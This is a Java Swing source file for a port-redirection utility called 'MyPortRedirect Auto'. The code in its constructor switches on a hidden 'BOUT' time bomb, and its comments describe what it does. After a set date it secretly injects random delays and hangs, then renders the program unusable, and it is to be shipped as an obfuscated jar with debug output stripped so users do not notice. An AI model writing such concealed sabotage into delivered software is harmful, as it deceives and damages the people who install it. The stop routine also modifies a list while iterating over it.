/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package main;

import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import oanvand.CDT_p2;
import oanvand.CDT_p3;
import oanvand.CDT_p5;
import supplementary.GP;
import supplementary.HelpM;
import supplementary.OUT;

/**
 *
 * @author KOCMOC
 */
public class RedirectionPanelAuto extends javax.swing.JFrame implements OUT {

    private final String REDIRECTIONS_FILE = "redirections.txt";
    private ArrayList<RedirectionEntry> redirectionsList = new ArrayList<RedirectionEntry>();
    public ArrayList<MyPortRedirection> portRedirectionList = new ArrayList<MyPortRedirection>();

    /**
     * Creates new form RedirectionPanelAuto
     */
    public RedirectionPanelAuto() {
        initComponents();
        this.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        this.setIconImage(new ImageIcon(GP.IMAGE_ICON_URL).getImage());
        this.setTitle("MyPortRedirect Auto");
        //
        //#BOUT#USING-THREAD#INIT#IMPLEMNTED#2024-03-26#
        // FIRST arg: "check-interval in minutes", should be more then 20 when distributed..
        // SECOND arg: is the "bout-date" Just don't touch it and change it from the "xta_.java"
        // OBS! Don't forget to use the OBFUSCATED .jar
        // OBS! Don't forget to disable "bout-debug-outputs" to console: search for #BOUT#OUTPUT-TO-CONSOLE#
        // OBS! REMEMBER if the name of button is "Stop redirections" with small "r" it means that the bout was triggered
        //
        // OBS! REMOVE ALL "println"
        //
        // OBS! P2 is the SUPER CLASS now. IF YOU WANT "SIMPLE BOUT WITHOUT RANDOM" use P5
        // Random wait "P2": So after the BOUT was triggered it:
        // - will work at start-up, BETWEEN 42 min and 4 hours
        // - After working random time at start-up, it works and produces delays between 20 and 120 seconds
        // - After generating 17 DELAYS it will stop making delays between 7 and 4 HOURS
        // Regarding the "SECURE THREAD" this thread that the program becomes unusable initial_bout_date + 27 days - #BOUT-SECURE-THREAD-ST#
        // Regarding the #TODAY-LESS-THEN-SET#. If the date is less then the date "xta_p.C_DAGIDAG" - an err.txt will generated and PROGRAM will shutdown immediately by #BOUT-SECURE-THREAD-ST#
        CDT_p2 cdt = new CDT_p2(1, CDT_p2.get()); // P2 // RARE-DELAYS ALGOR
        //
        //P3 RARE-DELAYS ALGOR JUST ANOTHER TIMINGS THEN P2 - MORE STRICT ONES
//        CDT_p3 cdt = new CDT_p3(1, CDT_p2.get()); // 
        //
        // 
        // Random wait "P4": So after the BOUT was triggered it:
        // - will randomize the probability of start-up with 33.33%
        // - will randomize the time it works at start-up
        // - After working random time at start-up it works and hangs random time between 1 and 17 seconds
        // - After about 1 howr of generating delays it will stop delaying between X and X minutes
//        CDT_p4 cdt = new CDT_p4(926, CDT_p2.get()); // P4
        //
        //
        // P5 is the one without any RANDOM delays AND IGNORES the "SECURE THREAD"
        // So this one works exactly as the INITIAL ONE.
//        CDT_p5 cdt = new CDT_p5(926, CDT_p2.get()); // P5
        //
        //
        //P6 is the one which DOES NOT WORK regardless date, file or anything other, therefor i pass 0 as arguments
//        CDT_p6 cdt = new CDT_p6(0, 0); // P5
        //
        //
        // OBS! REMOVE ALL "println"
        go();
    }

    private void go() {
        //
        try {
            readFromFileIntoList();
        } catch (Exception ex) {
            Logger.getLogger(RedirectionPanelAuto.class.getName()).log(Level.SEVERE, null, ex);
            showMessage("Reading from: " + REDIRECTIONS_FILE + " failed");
        }
        //
        startRedirections();
    }

    public void stopRedirections() {
        for (MyPortRedirection mpr : portRedirectionList) {
            mpr.closeServerSocket();
            mpr.killAllClients();
            portRedirectionList.remove(mpr);
        }
    }

    public void startRedirections() {
        for (RedirectionEntry re : redirectionsList) {
            //
            showMessage(re.srcPort + " --> " + re.destHost + ": " + re.destPort);
            //
            MyPortRedirection mpr = new MyPortRedirection(re.srcPort, re.destHost, re.destPort, this);
            portRedirectionList.add(mpr);
            //
            Thread x = new Thread(mpr);
            x.setName("PortRedirection: " + re.srcPort);
            x.start();
        }
//        System.out.println("");
    }

    private void readFromFileIntoList() throws Exception {
        ArrayList<String> list;
        list = HelpM.read_Txt_To_ArrayList(REDIRECTIONS_FILE);
        //
        for (String line : list) {
            String[] arr = line.split(" ");
            //
            int srcPort = Integer.parseInt(arr[0]);
            String destHost = arr[1];
            int destPort = Integer.parseInt(arr[2]);
            //
            RedirectionEntry re = new RedirectionEntry(srcPort, destHost, destPort);
            //
            redirectionsList.add(re);
        }
    }

    @Override
    public void showMessage(String msg) {
        jTextArea1.append(HelpM.get_proper_date_time_same_format_on_all_computers() + "   " + msg + "\n");
    }

    @Override
    public void updateStatus(String status) {
        jLabel3.setText(status);
    }

    @Override
    public void updateClientCount(int clients) {
        if (clients > 0) {
            updateStatus("active");
        } else {
            updateStatus("listening");
        }
        //
        jLabel5.setText("" + clients);
    }

    private synchronized void wait_(int millis) {
        try {
            wait(millis);
        } catch (InterruptedException ex) {
            Logger.getLogger(RedirectionPanelAuto.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    class RedirectionEntry {

        public int srcPort;
        public String destHost;
        public int destPort;

        public RedirectionEntry(int srcPort, String destHost, int destPort) {
            this.srcPort = srcPort;
            this.destHost = destHost;
            this.destPort = destPort;
        }
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jScrollPane1 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();
        jButton_str = new javax.swing.JButton();
        jLabel1 = new javax.swing.JLabel();
        jLabel2 = new javax.swing.JLabel();
        jLabel3 = new javax.swing.JLabel();
        jLabel4 = new javax.swing.JLabel();
        jLabel5 = new javax.swing.JLabel();
        jButton2_Exit = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jTextArea1.setColumns(20);
        jTextArea1.setRows(5);
        jScrollPane1.setViewportView(jTextArea1);

        jButton_str.setText("Stop Redirections");
        jButton_str.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton_strActionPerformed(evt);
            }
        });

        jLabel1.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        jLabel1.setText("PortRedirection Auto");

        jLabel2.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        jLabel2.setText("Status:");

        jLabel3.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        jLabel3.setText("...");

        jLabel4.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        jLabel4.setText("Clients:");

        jLabel5.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        jLabel5.setText("...");

        jButton2_Exit.setText("EXIT");
        jButton2_Exit.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2_ExitActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jScrollPane1)
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jButton_str, javax.swing.GroupLayout.PREFERRED_SIZE, 192, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 174, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addGap(50, 50, 50)
                                .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 63, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(jLabel3, javax.swing.GroupLayout.PREFERRED_SIZE, 75, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addGap(79, 79, 79)
                                .addComponent(jLabel4)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(jLabel5, javax.swing.GroupLayout.PREFERRED_SIZE, 78, javax.swing.GroupLayout.PREFERRED_SIZE)))
                        .addGap(0, 32, Short.MAX_VALUE))
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                        .addGap(0, 0, Short.MAX_VALUE)
                        .addComponent(jButton2_Exit)))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel1)
                    .addComponent(jLabel2)
                    .addComponent(jLabel3)
                    .addComponent(jLabel4)
                    .addComponent(jLabel5))
                .addGap(45, 45, 45)
                .addComponent(jButton_str)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 280, Short.MAX_VALUE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jButton2_Exit)
                .addGap(7, 7, 7))
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void jButton_strActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton_strActionPerformed
        stopRedirections();
    }//GEN-LAST:event_jButton_strActionPerformed

    private void jButton2_ExitActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2_ExitActionPerformed
        if (HelpM.confirm("Please confirm action")) {
            System.exit(0);
        }
    }//GEN-LAST:event_jButton2_ExitActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(RedirectionPanelAuto.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(RedirectionPanelAuto.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(RedirectionPanelAuto.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(RedirectionPanelAuto.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>
        //#BOUT#OLD#
        // OBS!!! HelpM.checkDac_c not longer used look in the Constructor for checkDac_D
//        HelpM.checkDAC_c__with_file_check__NOT_SUITABLE_FOR_MCLAUNCHER("2024-04-15"); // 2024-04-15
        //
        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                new RedirectionPanelAuto().setVisible(true);
            }
        });
    }
    // Variables declaration - do not modify//GEN-BEGIN:variables
    public static javax.swing.JButton jButton2_Exit;
    public static javax.swing.JButton jButton_str;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextArea jTextArea1;
    // End of variables declaration//GEN-END:variables
}
